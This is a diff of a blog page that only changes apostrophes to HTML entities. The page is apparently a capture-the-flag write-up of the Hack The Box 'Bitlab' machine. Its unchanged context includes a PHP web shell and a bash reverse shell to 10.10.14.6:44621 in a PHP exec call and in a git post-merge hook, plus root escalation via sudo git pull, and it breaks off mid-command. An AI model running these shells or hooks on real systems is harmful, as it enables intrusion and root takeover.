@@ -8,7 +8,7 @@
   content="jivex5k">
 <meta name="description"
   content="Welcome to another Forest Hex hacking adventure! 🌲🏹 Today I will be hacking an HTB box named bitlab.
- Let&#39;s dive right in with a port scan, and as always, feel free to jump around.
+ Let&amp;rsquo;s dive right in with a port scan, and as always, feel free to jump around.
  Port Scan Poking around the Web Server The Initial Foothold Escalating to Root Creating the Git Hook   Port Scan Port Scan  Not a lot here, just a web server on port 80 and ssh on port 22." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
@@ -153,7 +153,7 @@
     </figure>
 
 
-<p>Let's dive right in with a port scan, and as always, feel free to jump around.</p>
+<p>Let&rsquo;s dive right in with a port scan, and as always, feel free to jump around.</p>
 <ul>
 <li><a href="#port-scan">Port Scan</a></li>
 <li><a href="#poking-around-the-web-server">Poking around the Web Server</a></li>
@@ -174,7 +174,7 @@
 
 
 <p>Not a lot here, just a web server on port 80 and ssh on port 22.
-Time to poke around the server, I'll load it up in ZAP's proxy.</p>
+Time to poke around the server, I&rsquo;ll load it up in ZAP&rsquo;s proxy.</p>
 <hr>
 <h1 id="poking-around-the-web-server">Poking around the Web Server</h1>
 
@@ -185,8 +185,8 @@ Time to poke around the server, I'll load it up in ZAP's proxy.</p>
 
 </figure>
 
-<p>You can see how zap easily let's you dive into the framework of a web site. It's running a local git repo which is a good place to look for credentials, or even exploits in source code.</p>
-<p>I tried the default credentials but they didn't work, so then I switched to finding an exploit for it. The first thing I needed was the version of gitlab. A stackoverflow answer said <code>/help</code> would display this information.</p>
+<p>You can see how zap easily let&rsquo;s you dive into the framework of a web site. It&rsquo;s running a local git repo which is a good place to look for credentials, or even exploits in source code.</p>
+<p>I tried the default credentials but they didn&rsquo;t work, so then I switched to finding an exploit for it. The first thing I needed was the version of gitlab. A stackoverflow answer said <code>/help</code> would display this information.</p>
 <p>I found something much different. It was a plain looking page with a link named <code>Bookmarks</code>, and after clicking on it I go this:
 
     <figure class="left" >
@@ -226,12 +226,12 @@ document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 $db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
-</code></pre></div><p>This could be useful once I find a way to achieve code execution. For now I can't access the sql server since the port isn't exposed, and they don't work as ssh creds.</p>
+</code></pre></div><p>This could be useful once I find a way to achieve code execution. For now I can&rsquo;t access the sql server since the port isn&rsquo;t exposed, and they don&rsquo;t work as ssh creds.</p>
 <hr>
 <h1 id="the-initial-foothold">The Initial Foothold</h1>
 <p>While I was looking around I started to gain a better understanding of what was happening. There are two projects: <code>Profile</code> and <code>Deployer</code>. Profile is a simple php page, and deployer contains a script which will automatically pull any merge requests to the master branch in Profile. The php file is hosted on the web server at <code>/profile</code>, which I discovered by clicking on the settings link in the gitlab page.</p>
-<p>This means I should be able to create a reverse shell by editing the php file. The web interface allows me to do it so I don't even have to bother cloning the repo locally.</p>
-<p>In fact, this is a rare chance to try out a php web shell, I'm going to use the one here:
+<p>This means I should be able to create a reverse shell by editing the php file. The web interface allows me to do it so I don&rsquo;t even have to bother cloning the repo locally.</p>
+<p>In fact, this is a rare chance to try out a php web shell, I&rsquo;m going to use the one here:
 <a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php">https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php</a></p>
 <p>It worked like a charm:</p>
 
@@ -242,7 +242,7 @@ $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_quer
 
 </figure>
 
-<p>It's fun and all, but I truly prefer a terminal so I switched to this payload:</p>
+<p>It&rsquo;s fun and all, but I truly prefer a terminal so I switched to this payload:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1&#39;&#34;</span>);
 </code></pre></div>
@@ -255,7 +255,7 @@ $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_quer
 
 <p>After getting a netcat shell I upgraded it following this tutorial:
 <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
-<p>I didn't use socat, I used python and the method under the socat description to upgrade it to full TTY.</p>
+<p>I didn&rsquo;t use socat, I used python and the method under the socat description to upgrade it to full TTY.</p>
 <hr>
 <h1 id="escalating-to-root">Escalating to Root</h1>
 <p>The deployer script looked promising:</p>
@@ -275,15 +275,15 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 
 <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
 </code></pre></div><p>The <code>sudo git pull</code> command can be used to execute commands as root. I spent an extremely long time trying to think of a way to add a malicious git hook to the existing repo that would be pulled, but the two exploits I found were patched already.</p>
-<p>If you're curious:
+<p>If you&rsquo;re curious:
 <a href="https://blog.developer.atlassian.com/securing-your-git-server/">https://blog.developer.atlassian.com/securing-your-git-server/</a>
 <a href="https://github.blog/2018-10-05-git-submodule-vulnerability/">https://github.blog/2018-10-05-git-submodule-vulnerability/</a></p>
-<p>I read a lot more articles about them, and eventually realized the system is running <code>2.19.1</code> which has both of these patched. I was stuck for a while, even knowing I had passwordless sudo to use <code>git pull</code> I just couldn't make the connection. I reached out on discord for a nudge, all that was needed was a reminder of what I knew:</p>
+<p>I read a lot more articles about them, and eventually realized the system is running <code>2.19.1</code> which has both of these patched. I was stuck for a while, even knowing I had passwordless sudo to use <code>git pull</code> I just couldn&rsquo;t make the connection. I reached out on discord for a nudge, all that was needed was a reminder of what I knew:</p>
 <blockquote>
 <p>you only need to know that you can run sudo git pull as www-data</p>
 </blockquote>
-<p>It hit me like a ton of bricks.. I could simply copy the existing git repo to another folder and add a githook. The passwordless sudo access doesn't specify a folder so I can make a new one in /tmp and I will have the ability to create a new git hook.
-<code>git</code> itself is restricted, so I can't just do a git init either.</p>
+<p>It hit me like a ton of bricks.. I could simply copy the existing git repo to another folder and add a githook. The passwordless sudo access doesn&rsquo;t specify a folder so I can make a new one in /tmp and I will have the ability to create a new git hook.
+<code>git</code> itself is restricted, so I can&rsquo;t just do a git init either.</p>
 <hr>
 <h1 id="creating-the-git-hook">Creating the Git Hook</h1>
 <p>I tested if I could simply copy the <code>.git</code> folder and add a hook on my local machine, and had an issue with my powershell script. Apparently even in windows the githook still needs <code>#!/bin/bash</code>. I tried that but ended up with an error:
@@ -313,9 +313,9 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
 </span><span style="color:#75715e"></span>
 exec /bin/bash
-</code></pre></div><p>Now all there is to to is to push an update and sudo git pull&hellip; Or I thought. It didn't work, so I'm changing the post-merge to:
+</code></pre></div><p>Now all there is to to is to push an update and sudo git pull&hellip; Or I thought. It didn&rsquo;t work, so I&rsquo;m changing the post-merge to:
 <code>bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1</code></p>
-<p>Unfortunately that didn't work either. I decided to simply have it write an SSH public key to the authorized_keys folder of root. First I checked <code>/etc/passwd</code> to make sure root has a login, it does.</p>
+<p>Unfortunately that didn&rsquo;t work either. I decided to simply have it write an SSH public key to the authorized_keys folder of root. First I checked <code>/etc/passwd</code> to make sure root has a login, it does.</p>
 <p>After that I checked <code>/etc/ssh/sshd_config</code> to make sure I could log in with a public key. It does, and it looks in the normal place.</p>
 <p>I generate a new key with <code>ssh-keygen -t rsa</code>, <code>chmod 600 id_rsa</code> to give it the right permissions for the SSH client, and copy the public key to the post-merge hook:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@bitlab:/tmp/fine$ cat .git/hooks/post-merge
